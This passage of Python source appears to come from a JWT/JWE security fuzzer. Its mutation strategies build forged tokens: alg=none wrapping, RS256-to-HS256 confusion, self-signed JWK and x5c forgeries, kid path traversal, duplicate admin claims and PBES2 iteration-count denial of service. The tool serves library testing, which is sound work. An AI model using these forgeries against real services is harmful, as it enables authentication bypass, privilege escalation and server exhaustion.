        """Wrap a valid HS256-signed inner JWT as JWE (reaches pac4j-like)."""
        inner = _seed_token(self._resolve_secret(metadata))
        return _wrap_as_jwe(inner), False

    def _jwe_wrap_alg_none_inner(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """JWE wrapping alg=none inner token (nested PlainJWT bypass)."""
        parsed = _parse_compact_jwt(token)
        payload = parsed[2] if parsed else {
            "sub": "user-123", "role": "user",
            "iss": "https://issuer.example", "exp": 1893456000,
        }
        none_variant = self.rng.choice(NONE_VARIANTS).decode("ascii")
        inner_header = _json_dumps_bytes({"alg": none_variant, "typ": "JWT"})
        inner_payload = _json_dumps_bytes(payload)
        inner_token = _b64url_encode(inner_header) + b"." + _b64url_encode(inner_payload) + b"."
        return _wrap_as_jwe(inner_token), False

    def _jwe_wrap_cty_missing(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """JWE without cty=JWT — pac4j rejects (explores error branch)."""
        inner = _seed_token(self._resolve_secret(metadata))
        outer_header = {"alg": "RSA-OAEP", "enc": "A256GCM"}  # no cty
        return (
            _b64url_encode(_json_dumps_bytes(outer_header))
            + b"." + _b64url_encode(b"")
            + b"." + _b64url_encode(b"\x00" * 12)
            + b"." + _b64url_encode(inner)
            + b"." + _b64url_encode(b"\x00" * 16)
        ), False

    def _jwe_wrap_kid_injection(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """JWE with kid path traversal in outer header."""
        inner = _seed_token(self._resolve_secret(metadata))
        kid = self.rng.choice(KID_PAYLOADS[:4]).decode("utf-8", errors="replace")
        return _wrap_as_jwe(inner, {"kid": kid}), False

    def _jwe_wrap_duplicate_inner(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """JWE with duplicate claim keys in inner JWT payload."""
        inner_header_b64 = _b64url_encode(_json_dumps_bytes({"alg": "HS256", "typ": "JWT"}))
        inner_payload_raw = (
            b'{"sub":"user-123","role":"user","role":"admin",'
            b'"iss":"https://issuer.example","exp":1893456000}'
        )
        inner_payload_b64 = _b64url_encode(inner_payload_raw)
        signing_input = inner_header_b64 + b"." + inner_payload_b64
        sig = _sign_hs("HS256", signing_input, self._resolve_secret(metadata))
        inner_token = signing_input + b"." + sig
        return _wrap_as_jwe(inner_token), False

    # ------------------------------------------------------------------ #
    # J7 — Keyless attacks (§1-2, §2-3, §2-4, §7-1)                     #
    # These generate tokens that bypass verification WITHOUT the key.    #
    # ------------------------------------------------------------------ #

    def _jwk_selfsigned_rsa(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """§2-3: Self-signed token — generate own RSA keypair, embed public JWK, sign with private key.

        If any library trusts the embedded JWK for verification, this bypasses
        authentication completely. The attacker doesn't need the server's key.
        """
        _, _, payload = self._parts(token)
        priv_key, pub_numbers = _get_attacker_rsa_key()
        kid = self.rng.choice(["attacker-key-1", "kid-1", "default"])
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "jwk": _rsa_pub_to_jwk(pub_numbers, kid),
        }
        header_b64 = _b64url_encode(_json_dumps_bytes(header))
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        signing_input = header_b64 + b"." + payload_b64
        sig = _rsa_sign_rs256(signing_input, priv_key)
        return signing_input + b"." + sig, True

    def _alg_confusion_rs256_to_hs256(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """§1-2: Algorithm confusion — change RS256 to HS256, sign with RSA public key as HMAC secret.

        In an RS256 setup, the public key is known (OIDC /.well-known/jwks.json).
        If the library reads alg from the header and uses the public key as
        the HMAC secret, the attacker can forge any token.
        Uses the target's known RSA public key PEM bytes as the HMAC signing key.
        """
        _, _, payload = self._parts(token)
        pub_pem = metadata.get("jwt_rsa_public_key_pem", RSA_TARGET_PUBLIC_KEY_PEM)
        if isinstance(pub_pem, str):
            pub_pem = pub_pem.encode("utf-8")
        # Variant: some libraries strip PEM header/footer and use raw base64
        use_raw = self.rng.random() < 0.3
        if use_raw:
            # Strip PEM armor and whitespace, use raw base64 as secret
            stripped = pub_pem.replace(b"-----BEGIN PUBLIC KEY-----", b"")
            stripped = stripped.replace(b"-----END PUBLIC KEY-----", b"")
            stripped = stripped.replace(b"\n", b"").strip()
            pub_pem = stripped
        header = {"alg": "HS256", "typ": "JWT"}
        header_b64 = _b64url_encode(_json_dumps_bytes(header))
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        signing_input = header_b64 + b"." + payload_b64
        sig = _sign_hs("HS256", signing_input, pub_pem)
        return signing_input + b"." + sig, True

    def _x5c_selfsigned(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """§2-4: Self-signed X.509 cert embedded in x5c header.

        Generate a self-signed certificate, embed it in the x5c header array,
        and sign the token with the corresponding private key. If the library
        trusts x5c without validating against a CA, this bypasses auth.
        """
        priv_key, pub_numbers = _get_attacker_rsa_key()
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes
            import datetime

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, "attacker.example"),
            ])
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(priv_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.datetime(2024, 1, 1))
                .not_valid_after(datetime.datetime(2030, 1, 1))
                .sign(priv_key, hashes.SHA256())
            )
            from cryptography.hazmat.primitives import serialization
            cert_der = cert.public_bytes(serialization.Encoding.DER)
            cert_b64 = base64.b64encode(cert_der).decode("ascii")
        except Exception:
            # Fallback: use dummy base64 cert data
            cert_b64 = "MIIB" + "A" * 200
        _, _, payload = self._parts(token)
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "x5c": [cert_b64],
        }
        header_b64 = _b64url_encode(_json_dumps_bytes(header))
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        signing_input = header_b64 + b"." + payload_b64
        sig = _rsa_sign_rs256(signing_input, priv_key)
        return signing_input + b"." + sig, True

    def _jws_jwe_confusion(self, token: bytes, metadata: dict[str, Any]) -> tuple[bytes, bool]:
        """§7-1: JWS/JWE confusion — craft 5-segment JWE-like token with attacker-controlled claims.

        In an RS256 setup, anyone can encrypt with the public key.
        If a library's unified decode() auto-detects JWE and decrypts it,
        the attacker controls the decrypted payload without the private key.
        This creates a polyglot-like token that might be processed as JWE
        by one library and rejected by another.
        """
        _, _, payload = self._parts(token)
        payload_json = _json_dumps_bytes(payload)
        # Variant 1: "proper" JWE structure with RSA-OAEP header
        # Variant 2: ambiguous 5-segment with plaintext payload
        variant = self.rng.randint(0, 2)
        if variant == 0:
            # Fake JWE with RSA-OAEP — payload in "ciphertext" position (unencrypted)
            outer_header = {"alg": "RSA-OAEP", "enc": "A128CBC-HS256", "typ": "JWT"}
            return (
                _b64url_encode(_json_dumps_bytes(outer_header))
                + b"." + _b64url_encode(b"")           # encrypted key
                + b"." + _b64url_encode(b"\x00" * 16)  # IV
                + b"." + _b64url_encode(payload_json)   # "ciphertext" = raw payload
                + b"." + _b64url_encode(b"\x00" * 16)  # auth tag
            ), False
        elif variant == 1:
            # dir (direct) key agreement — no encrypted key segment
            outer_header = {"alg": "dir", "enc": "A256GCM", "typ": "JWT"}
            return (
                _b64url_encode(_json_dumps_bytes(outer_header))
                + b"."                                    # empty encrypted key
                + b"." + _b64url_encode(b"\x00" * 12)     # IV
                + b"." + _b64url_encode(payload_json)     # "ciphertext"
                + b"." + _b64url_encode(b"\x00" * 16)     # auth tag
            ), False
        else:
            # PBES2 with low iteration count — tests billion-hashes DoS (§3-4)
            outer_header = {
                "alg": "PBES2-HS256+A128KW",
                "enc": "A128CBC-HS256",
                "p2s": _b64url_encode(b"salt-value").decode("ascii"),
                "p2c": self.rng.choice([1, 10, 100, 2147483647]),  # last one = DoS
            }
            return (
                _b64url_encode(_json_dumps_bytes(outer_header))
                + b"." + _b64url_encode(b"\x00" * 32)    # encrypted key
                + b"." + _b64url_encode(b"\x00" * 16)    # IV
                + b"." + _b64url_encode(payload_json)     # "ciphertext"
                + b"." + _b64url_encode(b"\x00" * 16)     # auth tag
            ), False

    # ── J8: RFC gap exploitation ──────────────────────────────────

    def _duplicate_alg_header(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Duplicate alg header — first-wins vs last-wins ambiguity (RFC 8259 §4)."""
        segments, header, payload = self._parts(token)
        real_alg = header.get("alg", "HS256")
        payload_json = _b64url_decode(segments[1])
        if self.rng.random() < 0.5:
            raw_header = b'{"alg":"none","alg":' + json.dumps(real_alg).encode() + b'}'
        else:
            raw_header = b'{"alg":' + json.dumps(real_alg).encode() + b',"alg":"none"}'
        return (
            _b64url_encode(raw_header)
            + b"." + _b64url_encode(payload_json)
            + b"."
        ), False

    def _claim_type_confusion(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Inject type-confused claim values (null, bool, number, array, object)."""
        segments, header, payload = self._parts(token)
        field, value, _tag = self.rng.choice(CLAIM_TYPE_CONFUSION_VARIANTS)
        if field == "alg":
            header[field] = value
        else:
            payload[field] = value
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(_json_dumps_bytes(payload))
            + b"."
        ), False

    def _duplicate_sub_claim(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Duplicate sub claim — authz bypass via first-wins vs last-wins."""
        segments, header, payload = self._parts(token)
        original_sub = json.dumps(payload.get("sub", "user-123")).encode()
        evil_sub = json.dumps("admin").encode()
        payload.pop("sub", None)
        base_json = _json_dumps_bytes(payload)
        if base_json.startswith(b"{"):
            inner = base_json[1:].lstrip()
            if self.rng.random() < 0.5:
                raw = b'{"sub":' + original_sub + b',"sub":' + evil_sub
            else:
                raw = b'{"sub":' + evil_sub + b',"sub":' + original_sub
            if inner.startswith(b"}"):
                raw += b"}"
            else:
                raw += b"," + inner
        else:
            raw = base_json
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(raw)
            + b"."
        ), False

    def _lenient_json_parsing(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Non-standard JSON syntax — trailing commas, comments, single quotes."""
        segments, header, payload = self._parts(token)
        payload_json = _b64url_decode(segments[1])
        variant = self.rng.randint(0, 4)
        if variant == 0:
            mutated = payload_json.rstrip(b"}") + b",}"
        elif variant == 1:
            mutated = payload_json.rstrip(b"}") + b"/**/}"
        elif variant == 2:
            mutated = payload_json.replace(b'"', b"'")
        elif variant == 3:
            mutated = payload_json
            for key in [b"sub", b"iss", b"aud", b"exp", b"iat"]:
                mutated = mutated.replace(b'"' + key + b'":', key + b":")
        else:
            mutated = payload_json.rstrip(b"}")
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(mutated)
            + b"."
        ), False

    def _null_byte_injection(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Null bytes and zero-width chars — C-style truncation in FFI layers."""
        segments, header, payload = self._parts(token)
        field, value, _tag = self.rng.choice(NULL_BYTE_PAYLOADS)
        if field == "kid":
            header["kid"] = value
        else:
            payload[field] = value
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(_json_dumps_bytes(payload))
            + b"."
        ), False

    def _b64_type_variants(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """b64 header with non-boolean types and missing crit."""
        segments, header, payload = self._parts(token)
        payload_json = _b64url_decode(segments[1])
        variant = self.rng.randint(0, 3)
        if variant == 0:
            header["b64"] = 0
            header["crit"] = ["b64"]
        elif variant == 1:
            header["b64"] = None
            header["crit"] = ["b64"]
        elif variant == 2:
            header["b64"] = "false"
            header["crit"] = ["b64"]
        else:
            header["b64"] = False
            header.pop("crit", None)
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(payload_json)
            + b"."
        ), False

    def _duplicate_exp_type_confused(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Duplicate exp with type confusion — combines two attack vectors."""
        segments, header, payload = self._parts(token)
        payload.pop("exp", None)
        base_json = _json_dumps_bytes(payload)
        exp_num = b"1893456000"
        exp_str = b'"never"'
        if self.rng.random() < 0.5:
            dup = b'"exp":' + exp_num + b',"exp":' + exp_str
        else:
            dup = b'"exp":' + exp_str + b',"exp":' + exp_num
        if base_json == b"{}":
            raw = b"{" + dup + b"}"
        else:
            raw = b"{" + dup + b"," + base_json[1:]
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(raw)
            + b"."
        ), False

    def _crit_edge_cases(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Edge-case crit values — empty, known-only, self-referential."""
        segments, header, payload = self._parts(token)
        payload_json = _b64url_decode(segments[1])
        variant = self.rng.randint(0, 3)
        if variant == 0:
            header["crit"] = []
        elif variant == 1:
            header["crit"] = ["alg"]
        elif variant == 2:
            header["crit"] = ["crit"]
        else:
            header["crit"] = ["b64", "unknown_ext"]
            header["b64"] = False
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(payload_json)
            + b"."
        ), False

    def _exp_negative_and_zero(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Extreme exp values — negative, zero, overflow."""
        segments, header, payload = self._parts(token)
        variant = self.rng.randint(0, 2)
        if variant == 0:
            payload["exp"] = -1
        elif variant == 1:
            payload["exp"] = 0
        else:
            payload["exp"] = 9007199254740993  # 2^53 + 1
        return (
            _b64url_encode(_json_dumps_bytes(header))
            + b"." + _b64url_encode(_json_dumps_bytes(payload))
            + b"."
        ), False

    def _base64_whitespace(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Whitespace injected into base64url segments."""
        segments, header, payload = self._parts(token)
        header_b64 = _b64url_encode(_json_dumps_bytes(header))
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        ws = self.rng.choice([b" ", b"\n", b"\t", b"\r\n"])
        target = self.rng.randint(0, 1)
        if target == 0 and len(header_b64) > 4:
            pos = self.rng.randint(2, len(header_b64) - 2)
            header_b64 = header_b64[:pos] + ws + header_b64[pos:]
        elif len(payload_b64) > 4:
            pos = self.rng.randint(2, len(payload_b64) - 2)
            payload_b64 = payload_b64[:pos] + ws + payload_b64[pos:]
        return header_b64 + b"." + payload_b64 + b".", False

    def _missing_alg_header(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Header with no alg field — tests default algorithm behavior."""
        segments, header, payload = self._parts(token)
        header_no_alg = {"typ": "JWT"}
        return (
            _b64url_encode(_json_dumps_bytes(header_no_alg))
            + b"." + _b64url_encode(_json_dumps_bytes(payload))
            + b"."
        ), False

    def _segment_count_variants(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes, bool]:
        """Non-standard segment counts — 1, 2, or empty segments."""
        segments, header, payload = self._parts(token)
        header_b64 = _b64url_encode(_json_dumps_bytes(header))
        payload_b64 = _b64url_encode(_json_dumps_bytes(payload))
        variant = self.rng.randint(0, 3)
        if variant == 0:
            return header_b64, False
        elif variant == 1:
            return header_b64 + b"." + payload_b64, False
        elif variant == 2:
            return b"..", False
        else:
            return header_b64 + b"." + payload_b64 + b"." + b"." + b"extra", False

    # ------------------------------------------------------------------
    # J9 — CVE-driven attack vectors (NDSS 2026, BH2023, real CVEs)
    # ------------------------------------------------------------------

    def _zip_in_jws(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """Add zip:"DEF" to JWS header (RFC 7516 §4.1.3: zip is JWE-only)."""
        segments, header, payload = self._parts(token)
        if not header:
            return None, False
        header["zip"] = "DEF"
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _iss_mixed_array(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """Array iss with mixed trusted/untrusted — CVE-2025-30144, CVE-2024-53861."""
        segments, header, payload = self._parts(token)
        if not payload:
            return None, False
        legit = payload.get("iss", "https://accounts.example.com")
        if isinstance(legit, list):
            legit = legit[0] if legit else "https://accounts.example.com"
        variant = self.rng.choice([
            [legit, "https://evil.com"],
            ["https://evil.com", legit],
            [legit],
            [legit, legit, "https://evil.com"],
        ])
        payload["iss"] = variant
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _deeply_nested_claims(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """Object-typed claims — type coercion + extraction confusion."""
        segments, header, payload = self._parts(token)
        if not payload:
            return None, False
        field, nested = self.rng.choice([
            ("sub", {"value": "admin", "realm": "internal"}),
            ("aud", {"primary": "https://app.com", "secondary": "https://api.com"}),
            ("iss", {"url": "https://accounts.example.com", "tenant": "default"}),
            ("exp", {"value": int(_time.time()) + 3600, "grace": 300}),
        ])
        payload[field] = nested
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _pkcs1_pem_confusion(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """Signal PKCS#1 format — CVE-2023-48223, CVE-2024-33663."""
        segments, header, payload = self._parts(token)
        if not header:
            return None, False
        alg = header.get("alg", "")
        if not str(alg).upper().startswith("RS"):
            header["alg"] = "RS256"
        header["x5t"] = "pkcs1-format-hint"
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    def _zip_variant_headers(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """Non-standard zip values — parser robustness."""
        segments, header, payload = self._parts(token)
        if not header:
            return None, False
        header["zip"] = self.rng.choice(["gzip", "none", "", "DEFLATE", "zlib"])
        return self._assemble(_json_dumps_bytes(header), _json_dumps_bytes(payload), metadata)

    # ------------------------------------------------------------------ #
    # J10 — Fuzzer gap coverage                                           #
    # ------------------------------------------------------------------ #

    def _pbes2_p2c_dos(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """§3-4: PBES2 p2c DoS — JWE with extreme PBKDF2 iteration count.

        PBES2-HS256+A128KW uses p2c (PBES2 Count) to control PBKDF2 iterations.
        RFC 7518 §4.8.1.2 says p2c SHOULD be at least 1000 but sets no upper bound.
        An attacker sets p2c to 2^31 or higher → server spends minutes deriving key.
        Libraries differ: some cap p2c, some reject, some process unconditionally.
        """
        segments, header, payload = self._parts(token)
        if not header:
            return None, False
        # Build JWE-style header with PBES2 algorithm
        pbes2_alg = self.rng.choice([
            "PBES2-HS256+A128KW",
            "PBES2-HS384+A192KW",
            "PBES2-HS512+A256KW",
        ])
        p2c_value = self.rng.choice([
            2**31,          # max int32 — minutes of CPU
            2**31 - 1,      # just under overflow boundary
            2**24,          # 16M iterations — still extreme
            10**9,          # 1 billion
            0,              # zero — some libs divide by zero or skip
            -1,             # negative — type confusion
            1,              # minimal — functional but weak
        ])
        p2s = base64.urlsafe_b64encode(
            self.rng.randbytes(16)
        ).rstrip(b"=").decode("ascii")
        jwe_header = {
            "alg": pbes2_alg,
            "enc": self.rng.choice(["A128GCM", "A256GCM", "A128CBC-HS256"]),
            "p2c": p2c_value,
            "p2s": p2s,
        }
        # Wrap the original JWS as a mock 5-segment JWE
        inner = token
        return (
            _b64url_encode(_json_dumps_bytes(jwe_header))
            + b"." + _b64url_encode(b"")              # encrypted key
            + b"." + _b64url_encode(b"\x00" * 12)     # IV
            + b"." + _b64url_encode(inner)             # "ciphertext"
            + b"." + _b64url_encode(b"\x00" * 16)     # auth tag
        ), False

    def _alg_downgrade(
        self, token: bytes, metadata: dict[str, Any],
    ) -> tuple[bytes | None, bool]:
        """§1-3: Algorithm downgrade — switch to weaker variant in same family.

        RS512→RS256, ES512→ES256, PS512→PS256, etc.
        Tests whether library enforces the expected algorithm strength or
        accepts any algorithm in the same family.  Real-world impact: OIDC
        configs expecting ES384 may accept ES256 with a weaker curve key.
        """
        segments, header, payload = self._parts(token)
        if not header:
            return None, False
        original_alg = str(header.get("alg", ""))
        # Downgrade tables: strong → weak within same family
        _DOWNGRADE_MAP: dict[str, list[str]] = {
            "RS512": ["RS384", "RS256"],
            "RS384": ["RS256"],
            "RS256": ["RS384", "RS512"],  # upgrade also interesting
            "ES512": ["ES384", "ES256"],
            "ES384": ["ES256"],
            "ES256": ["ES384", "ES512"],
            "PS512": ["PS384", "PS256"],
            "PS384": ["PS256"],
            "PS256": ["PS384", "PS512"],
            "HS512": ["HS384", "HS256"],
            "HS384": ["HS256"],
            "HS256": ["HS384", "HS512"],
            "EdDSA": ["Ed25519", "Ed448"],  # curve variant confusion
        }
        candidates = _DOWNGRADE_MAP.get(original_alg)
        if not candidates:
            # Pick a random cross-family confusion
            header["alg"] = self.rng.choice(["RS256", "ES256", "PS256", "HS256"])
        else:
            header["alg"] = self.rng.choice(candidates)
        return self._assemble(
            _json_dumps_bytes(header), _json_dumps_bytes(payload), metadata
        )

    # ── Feedback API (matches cookie_mutator interface) ───────

    def feedback(self, strategy_name: str, signal: str) -> None:
        """Receive feedback from engine about strategy effectiveness.

        Args:
            strategy_name: Name of the strategy that produced the result.
            signal: "finding", "stage_up", or "coverage".
        """
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return

        self._total_feedback_calls += 1

        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "stage_up":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] * 15 // 100, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "coverage":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
                self._base_weights[idx] * 3,
            )

        if self._total_feedback_calls % 1000 == 0:
            for i in range(len(self._strategies)):
                if self._strategy_finds[i] == 0 and self._strategy_cov[i] == 0:
                    self._weights[i] = max(self._weights[i] - 1, 1)

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        """Reset dynamic weights — called by engine on stall detection."""
        if boost_zero_finds:
            for i in range(len(self._strategies)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 2,
                    )
                else:
                    self._weights[i] = self._base_weights[i]
        else:
            self._weights = list(self._base_weights)

    # ── Guidance integration ──

    # Map guidance field names → strategy name substrings that target those fields
    _FIELD_TO_STRATEGIES: dict[str, list[str]] = {
        "header.alg": ["alg_none", "alg_unknown", "alg_rs_to_hs", "alg_es_to_hs",
                        "alg_whitespace", "alg_confusion", "alg_downgrade",
                        "missing_alg", "duplicate_alg"],
        "header.crit": ["crit_edge", "b64_false_crit"],
        "header.kid": ["kid_path", "kid_sql", "duplicate_kid", "jwe_wrap_kid"],
        "header.jku": ["jku_injection"],
        "header.jwk": ["embedded_jwk", "jwk_selfsigned"],
        "header.x5u": ["x5u_injection"],
        "header.x5c": ["x5c_selfsigned"],
        "header.typ": ["typ_confusion"],
        "header.cty": ["cty_nested", "jwe_wrap_cty"],
        "header.b64": ["b64_false", "b64_type", "noncanonical_payload"],
        "payload.exp": ["exp_remove", "exp_far_future", "exp_boundary",
                        "exp_negative", "duplicate_exp", "scientific_notation_exp"],
        "payload.nbf": ["nbf_backdate"],
        "payload.aud": ["aud_array"],
        "payload.iss": ["issuer_array", "iss_mixed"],
        "payload.sub": ["duplicate_sub", "unicode_escape_sub"],
        "payload.role": ["role_escalation", "duplicate_role"],
        "payload.scope": ["scope_expansion"],
    }

    def apply_guidance_weights(self, field_weights: dict[str, float]) -> None:
        """Apply guidance-driven weight boosts with zero-sum rebalancing.

        Targeted strategies get 3-5x boost; non-targeted get attenuated
        so targeted strategies hold ~40% of total selection probability.
        """
        targeted: set[int] = set()
        for field, multiplier in field_weights.items():
            strategy_patterns = self._FIELD_TO_STRATEGIES.get(field, [])
            if not strategy_patterns:
                continue
            for i, sname in enumerate(self._strategy_names):
                if any(pat in sname for pat in strategy_patterns):
                    boost = 1.0 + 4.0 * multiplier  # focus=1.0→5x, secondary=0.3→2.2x
                    self._weights[i] = min(
                        int(self._base_weights[i] * boost),
                        self._base_weights[i] * 6,
                    )
                    targeted.add(i)

        if not targeted:
            return

        # Attenuate non-targeted to make boost meaningful
        targeted_sum = sum(self._weights[i] for i in targeted)
        non_targeted = [i for i in range(len(self._weights)) if i not in targeted]
        non_targeted_sum = sum(self._weights[i] for i in non_targeted)
        if non_targeted_sum > 0:
            desired_ratio = 1.5  # targeted:non_targeted ≈ 40:60
            scale = min(targeted_sum * desired_ratio / non_targeted_sum, 1.0)
            for i in non_targeted:
                self._weights[i] = max(int(self._weights[i] * scale), 1)
